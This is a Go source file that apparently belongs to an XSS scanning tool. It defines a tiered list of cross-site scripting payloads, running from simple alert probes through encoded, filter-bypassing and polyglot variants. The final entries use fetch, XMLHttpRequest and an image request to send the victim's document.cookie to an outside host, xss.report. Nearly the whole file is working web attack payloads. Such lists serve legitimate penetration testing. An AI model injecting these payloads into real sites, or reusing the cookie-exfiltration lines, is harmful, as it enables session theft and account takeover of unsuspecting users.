package payload

type PayloadEntry struct {
	Value    string
	Level    int
	Category string
	XSSType  string
}

func GetPayloads(level int, external []string) []PayloadEntry {
	var result []PayloadEntry
	for _, p := range AllPayloads {
		if p.Level <= level {
			result = append(result, p)
		}
	}
	for _, raw := range external {
		if raw != "" {
			result = append(result, PayloadEntry{
				Value:    raw,
				Level:    level,
				Category: "External",
				XSSType:  "Reflected",
			})
		}
	}
	return result
}

func LevelName(level int) string {
	switch level {
	case 1:
		return "Basic"
	case 2:
		return "Medium"
	case 3:
		return "Advanced"
	case 4:
		return "Expert"
	case 5:
		return "Full"
	}
	return "Unknown"
}

var AllPayloads = []PayloadEntry{
	{"<script>alert(1)</script>", 1, "BasicScript", "Reflected"},
	{"<script>alert('XSS')</script>", 1, "BasicScript", "Reflected"},
	{"<script>confirm(1)</script>", 1, "BasicScript", "Reflected"},
	{"<script>prompt(1)</script>", 1, "BasicScript", "Reflected"},
	{"<script>alert(document.domain)</script>", 1, "BasicScript", "Reflected"},
	{"<script>alert(document.cookie)</script>", 1, "BasicScript", "Reflected"},
	{"<img src=x onerror=alert(1)>", 1, "ImgTag", "Reflected"},
	{"<img src=x onerror=alert('XSS')>", 1, "ImgTag", "Reflected"},
	{"<svg onload=alert(1)>", 1, "SVGTag", "Reflected"},
	{`"><script>alert(1)</script>`, 1, "BreakOut", "Reflected"},
	{`'><script>alert(1)</script>`, 1, "BreakOut", "Reflected"},
	{"</script><script>alert(1)</script>", 1, "ScriptBreak", "Reflected"},
	{"<b onmouseover=alert(1)>hover</b>", 1, "EventHandler", "Reflected"},

	{"<ScRiPt>alert(1)</sCriPt>", 2, "CaseMix", "Reflected"},
	{"<SCRIPT>alert(1)</SCRIPT>", 2, "CaseMix", "Reflected"},
	{"<img/src=x onerror=alert(1)>", 2, "ImgNoSpace", "Reflected"},
	{`<img src=x onerror="alert(1)">`, 2, "ImgQuoted", "Reflected"},
	{"<body onload=alert(1)>", 2, "BodyTag", "Reflected"},
	{"<input autofocus onfocus=alert(1)>", 2, "InputFocus", "Reflected"},
	{"<select autofocus onfocus=alert(1)>", 2, "SelectFocus", "Reflected"},
	{"<textarea autofocus onfocus=alert(1)>", 2, "TextareaFocus", "Reflected"},
	{"<video src=x onerror=alert(1)>", 2, "VideoTag", "Reflected"},
	{"<audio src=x onerror=alert(1)>", 2, "AudioTag", "Reflected"},
	{"<details open ontoggle=alert(1)>", 2, "DetailsTag", "Reflected"},
	{"<marquee onstart=alert(1)>", 2, "MarqueeTag", "Reflected"},
	{`<a href="javascript:alert(1)">click</a>`, 2, "HrefJS", "Reflected"},
	{`" onmouseover="alert(1)`, 2, "AttrBreak", "Reflected"},
	{`' onmouseover='alert(1)`, 2, "AttrBreak", "Reflected"},
	{`"><img src=x onerror=alert(1)>`, 2, "TagBreak", "Reflected"},
	{`'><img src=x onerror=alert(1)>`, 2, "TagBreak", "Reflected"},
	{"</title><script>alert(1)</script>", 2, "TitleBreak", "Reflected"},
	{"</textarea><script>alert(1)</script>", 2, "TextareaBreak", "Reflected"},
	{"</style><script>alert(1)</script>", 2, "StyleBreak", "Reflected"},
	{`<object data="javascript:alert(1)">`, 2, "ObjectTag", "Reflected"},
	{`<button onclick="alert(1)">x</button>`, 2, "ButtonClick", "Reflected"},

	{"<script>alert(String.fromCharCode(88,83,83))</script>", 3, "CharCode", "Reflected"},
	{"<img src=x onerror=eval(atob('YWxlcnQoMSk='))>", 3, "Base64Eval", "Reflected"},
	{"<svg><script>alert&#40;1&#41;</script>", 3, "HTMLEntity", "Reflected"},
	{"<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>", 3, "EntityEncoded", "Reflected"},
	{`<script>\u0061\u006C\u0065\u0072\u0074(1)</script>`, 3, "UnicodeEscape", "Reflected"},
	{"<script>window['al'+'ert'](1)</script>", 3, "StringConcat", "Reflected"},
	{`<script>window['\x61\x6c\x65\x72\x74'](1)</script>`, 3, "HexEscape", "Reflected"},
	{"<script>setTimeout('alert(1)',0)</script>", 3, "Timeout", "Reflected"},
	{"<script>Function('alert(1)')()</script>", 3, "FunctionCtor", "Reflected"},
	{"<script>(()=>{alert(1)})()</script>", 3, "ArrowIIFE", "Reflected"},
	{"<svg><animate onbegin=alert(1) attributeName=x></svg>", 3, "SVGAnimate", "Reflected"},
	{"<math><mtext></p><img src=x onerror=alert(1)>", 3, "MathMLContext", "Reflected"},
	{`<div style="background:url(javascript:alert(1))">`, 3, "CSSBackground", "Reflected"},
	{"%3Cscript%3Ealert(1)%3C/script%3E", 3, "URLEncoded", "Reflected"},
	{`"><script >alert(1)</script >`, 3, "SpaceBypass", "Reflected"},
	{"<scr<script>ipt>alert(1)</scr</script>ipt>", 3, "DoubleTagBypass", "Reflected"},
	{"<script>alert(1)//", 3, "CommentBypass", "Reflected"},
	{"<svg/onload=alert(1)>", 3, "SVGSlash", "Reflected"},
	{"<img src=1 onerror=alert(1) x=", 3, "ImgUnclosed", "Reflected"},
	{`<script>location='javascript:alert(1)'</script>`, 3, "LocationJS", "Reflected"},

	{"';alert(1)//", 4, "JSContextBreak", "DOM"},
	{`";alert(1)//`, 4, "JSContextBreak", "DOM"},
	{"</script><svg onload=alert(1)>", 4, "ScriptSVGChain", "DOM"},
	{`javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'> `, 4, "Polyglot", "DOM"},
	{"<iframe src=\"javascript:alert(1)\">", 4, "IframeJS", "DOM"},
	{"<iframe srcdoc=\"<script>alert(1)</script>\">", 4, "IframeSrcdoc", "DOM"},
	{"<base href=\"javascript:alert(1)//\"><a href=\"/x\">click</a>", 4, "BaseTag", "DOM"},
	{"<script>document.write('<img src=x onerror=alert(1)>')</script>", 4, "DocWrite", "DOM"},
	{"<script>document.body.innerHTML='<img src=x onerror=alert(1)>'</script>", 4, "InnerHTML", "DOM"},
	{"<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert(1)\">", 4, "MetaRefresh", "Reflected"},
	{"<form action=\"javascript:alert(1)\"><input type=submit>", 4, "FormAction", "Reflected"},
	{"<button formaction=\"javascript:alert(1)\">x</button>", 4, "ButtonFormaction", "Reflected"},
	{"<img src=1 href=1 onerror=\"javascript:alert(1)\"></img>", 4, "ImgHref", "Reflected"},
	{"<audio><source onerror=\"javascript:alert(1)\">", 4, "AudioSource", "Reflected"},
	{"<input type=\"image\" src=1 onerror=\"alert(1)\">", 4, "InputImage", "Reflected"},
	{"<script>window.onerror=alert;throw 1</script>", 4, "WindowOnError", "DOM"},
	{"<script>({}).constructor.constructor('alert(1)')()</script>", 4, "ProtoConstructor", "DOM"},
	{"<script>[].map.constructor('alert(1)')()</script>", 4, "ArrayConstructor", "DOM"},
	{"'onmouseover='alert(1)", 4, "AttrInjection", "DOM"},
	{`"onmouseover="alert(1)`, 4, "AttrInjection", "DOM"},

	{`jaVasCript:/*-/*` + "`" + `/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e`, 5, "UltimatePolyglot", "Polyglot"},
	{`'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)><Script>prompt(1)</Script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>`, 5, "MegaPolyglot", "Polyglot"},
	{"<script>import('data:text/javascript,alert(1)')</script>", 5, "DynamicImport", "DOM"},
	{"<script>Reflect.apply(alert,[null,[1]])</script>", 5, "ReflectApply", "DOM"},
	{"<svg><use href=\"data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg'><script>alert(1)</script></svg>#x\">", 5, "SVGUseHref", "DOM"},
	{"<!--<img src=\"--><img src=x onerror=alert(1)//\">", 5, "CommentBreak", "Reflected"},
	{"<xss onafterscriptexecute=alert(1)><script>1</script>", 5, "AfterScript", "Reflected"},
	{"<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">", 5, "NoscriptBreak", "Reflected"},
	{"<script>window.__proto__.toString=alert;window+''</script>", 5, "ProtoToString", "DOM"},
	{"<script>throw{message:alert(1)}</script>", 5, "ThrowExpr", "DOM"},
	{"<script>new Image().src='//xss.report/c/demo?c='+document.cookie</script>", 5, "CookieExfil", "Blind"},
	{"<script>var x=new XMLHttpRequest();x.open('GET','//xss.report/c/demo?c='+document.cookie,true);x.send()</script>", 5, "XHRExfil", "Blind"},
	{"<script>fetch('//xss.report/c/demo?c='+document.cookie)</script>", 5, "FetchExfil", "Blind"},
}
